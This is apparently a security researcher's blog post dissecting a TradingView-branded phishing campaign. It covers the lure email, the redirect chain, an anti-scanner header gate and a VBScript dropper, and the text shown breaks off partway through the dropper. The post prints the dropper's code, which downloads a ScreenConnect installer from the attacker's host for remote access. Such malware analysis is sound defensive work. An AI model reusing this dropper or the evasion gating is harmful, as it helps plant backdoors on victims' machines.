---
title: Inside a TradingView Phishing Kill Chain: Dissecting a Self-Hosted ScreenConnect Phishing Campaign
url: https://osandamalith.com/2026/07/07/a-phishing-email-a-fake-trial-and-a-real-backdoor/
source: 🔐Blog of Osanda
date: 2026-07-07
fetch_date: 2026-07-08T05:04:08.779885
---

# Inside a TradingView Phishing Kill Chain: Dissecting a Self-Hosted ScreenConnect Phishing Campaign

[## 🔐Blog of Osanda

### Security Researching and Reverse Engineering](https://osandamalith.com/ "🔐Blog of Osanda")

[Skip to content](#content "Skip to content")

* [🏠 Home](https://osandamalith.com/)
* [🔒 My Advisories](https://osandamalith.com/my-exploits/)
* [💊 Cool Posts](https://osandamalith.com/cool-posts/)
  + [💉 SQLi](https://osandamalith.com/tag/mysql/)
  + [🕷 Web App Security](https://osandamalith.com/category/web-application-security/)
  + [🛠 Tools](https://osandamalith.com/category/tools/)
  + [☢ Exploits](https://osandamalith.com/category/exploits/)
  + [🔬 Reverse Engineering](https://osandamalith.com/category/reversing-2/)
  + [🧬 Malware Analysis](https://osandamalith.com/category/malware/)
* [☠ Shellcodes](https://osandamalith.com/shellcodes/)
* [☣ About](https://osandamalith.com/about/)

* [Osanda Malith Jayathissa](https://osandamalith.com/author/osandamalith/ "View all posts by Osanda Malith Jayathissa")
* [July 7, 2026](https://osandamalith.com/2026/07/07/a-phishing-email-a-fake-trial-and-a-real-backdoor/ "11:58 pm")

# [Inside a TradingView Phishing Kill Chain: Dissecting a Self-Hosted ScreenConnect Phishing Campaign](https://osandamalith.com/2026/07/07/a-phishing-email-a-fake-trial-and-a-real-backdoor/)

# Kill chain overview

[![](https://i0.wp.com/osandamalith.com/wp-content/uploads/2026/07/screenconnect_phishing_kill_chain_3-scaled.png?resize=640%2C670&ssl=1)](https://i0.wp.com/osandamalith.com/wp-content/uploads/2026/07/screenconnect_phishing_kill_chain_3-scaled.png?ssl=1)

# The lure

It started with a well-timed email: “Welcome! Your Free 1-Month Trial Has Started,” branded as TradingView, landing in my inbox with a friendly nudge to “Test Drive the Desktop App.” Given my public interest in algo trading, this wasn’t random spray, it was a targeted pretext.

The email authenticated cleanly: SPF, DKIM, and DMARC all passed. But look closer at *what* they passed for:

```
From: Tradingview <no-reply@reviews.io>
dkim=pass header.i=@reviews.io
dkim=pass header.i=@amazonses.com
```

[![](https://i0.wp.com/osandamalith.com/wp-content/uploads/2026/07/Screenshot_17.png?resize=640%2C788&ssl=1)](https://i0.wp.com/osandamalith.com/wp-content/uploads/2026/07/Screenshot_17.png?ssl=1)

[![](https://i0.wp.com/osandamalith.com/wp-content/uploads/2026/07/Screenshot_18-Copy.png?resize=640%2C403&ssl=1)](https://i0.wp.com/osandamalith.com/wp-content/uploads/2026/07/Screenshot_18-Copy.png?ssl=1)

This isn’t spoofing in the classic sense, it’s **abuse of a legitimate email service provider account**. The display name says “Tradingview,” but the authenticated sending domain is `reviews.io`, relayed through Amazon SES. Most mail filters (and most humans) only check the display name, so this sails through as a trusted sender.

More telling: the HTML template embeds tracking pixels and analytics parameters pointing at genuine TradingView infrastructure (`snowplow-pixel.tradingview.com`, a message-ID referencing `pmta-int-nlb.xtools.tv`). Every link in the email: App Store, Google Play, social media, unsubscribe goes to a real TradingView or reviews.io URL.

Except one. The primary call-to-action, “Test Drive the Desktop App,” points to:

```
https://sites.google.com/view/hf8es/home-page
```

[![](https://i0.wp.com/osandamalith.com/wp-content/uploads/2026/07/Screenshot_10.png?resize=640%2C296&ssl=1)](https://i0.wp.com/osandamalith.com/wp-content/uploads/2026/07/Screenshot_10.png?ssl=1)

# The redirect chain

The Google Sites page forwards to a second-stage domain:

```
https://latest-download.org/
```

This domain doesn’t respond consistently to every request, testing it directly shows the gating mechanism clearly:

```
Request: User-Agent and Accept-Language both populated
Response: HTTP/2 200 OK

Request: User-Agent missing
Response: HTTP/2 404 Not Found

Request: Accept-Language missing
Response: HTTP/2 404 Not Found
```

If we provide some random values for `User-Agent` and `Accept-Language` header, the server responds with a `200 OK`.![](https://i0.wp.com/osandamalith.com/wp-content/uploads/2026/07/burp1.png?resize=640%2C169&ssl=1)Missing any value in either of the headers will throw a `404 Not Found`.[![](https://i0.wp.com/osandamalith.com/wp-content/uploads/2026/07/burp2.png?resize=640%2C119&ssl=1)](https://i0.wp.com/osandamalith.com/wp-content/uploads/2026/07/burp2.png?ssl=1) [![](https://i0.wp.com/osandamalith.com/wp-content/uploads/2026/07/burp3.png?resize=640%2C126&ssl=1)](https://i0.wp.com/osandamalith.com/wp-content/uploads/2026/07/burp3.png?ssl=1)

The pattern is unambiguous: the server requires both a non-empty `User-Agent` and a non-empty `Accept-Language` header before it serves content, returning a generic nginx 404 to anything less than a fully-formed browser fingerprint. This is a lightweight anti-bot/anti-scanner gate rather than referrer-based access control, it filters out curl, basic scanners, automated sandbox crawlers, and any tooling that sends minimal or incomplete headers, while serving payload normally to traffic that looks like an ordinary browser. It’s a cheap, effective way to keep security researchers and naive automated analysis off the real payload without needing session tokens or referrer checks at all.

**Worth noting: this is a different server stack entirely from the C2 host.** `latest-download.org` identifies itself as `nginx`, whereas `area.usit-services.com` (the ScreenConnect relay) is Microsoft IIS on Windows Server. The infrastructure isn’t monolithic, the staging/redirector tier runs on separate Linux infrastructure from the Windows box hosting the actual C2 relay. This split is common in this style of campaign: the redirector is treated as cheap and disposable (easy to stand up on any commodity Linux VPS, easy to burn and replace once flagged), while the C2 host, in this case the compromised institutional Windows server, is the more valuable, persistent asset the operator wants to keep running as long as possible. It also means taking down the staging domain alone wouldn’t disrupt the C2 relay, and vice versa; both need separate reporting/disruption efforts, which is exactly what’s underway here.

Following the real chain in an isolated VM, this stage ultimately serves the VBScript dropper.

[![](https://i0.wp.com/osandamalith.com/wp-content/uploads/2026/07/Screenshot_11.png?resize=640%2C493&ssl=1)](https://i0.wp.com/osandamalith.com/wp-content/uploads/2026/07/Screenshot_11.png?ssl=1) [![](https://i0.wp.com/osandamalith.com/wp-content/uploads/2026/07/Screenshot_12.png?resize=640%2C438&ssl=1)](https://i0.wp.com/osandamalith.com/wp-content/uploads/2026/07/Screenshot_12.png?ssl=1) [![](https://i0.wp.com/osandamalith.com/wp-content/uploads/2026/07/Screenshot_13.png?resize=640%2C503&ssl=1)](https://i0.wp.com/osandamalith.com/wp-content/uploads/2026/07/Screenshot_13.png?ssl=1)

# Static analysis: the VBScript dropper

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objHTTP = CreateObject("MSXML2.XMLHTTP")
Set objApp = CreateObject("Shell.Application")
URL = "https://area.usit-services.com/Bin/ScreenConne[...REDACTED...].msi?e=Access&y=Guest&c=a83e4450d1061663&c=4884e4d2a838254e&c=b29e10e7b2b5bb71&c=27358e46ca319876&c=&c=&c=&c="
' Get clean, static absolute paths
tempFolder = objFSO.GetSpecialFolder(2)
MSIPath = tempFolder & "\installer.msi"
sys32Folder = objFSO.GetSpecialFolder(1)
' 1. Download MSI file cleanly
On Error Resume Next
objHTTP.Open "GET", URL, False
objHTTP.Send
If Err.Number = 0 And objHTTP.Status = 200 Then
Set objADOStream = CreateObject("ADODB.Stream")
objADOStream.Type = 1 ' Binary
objADOStream.Open
objADOStream.Write objHTTP.ResponseBody
objADOStream.SaveToFile MSIPath, 2 ' Overwrite existing
objADOStream.Close
Else
' Optional: Un-comment for debugging network/download blocks if it fails here
' MsgBox "Download failed. Status: " & objHTTP.Status & " Error: " & Err.Description
WScript.Quit
End If
On Error GoTo 0 ' Reset error handli...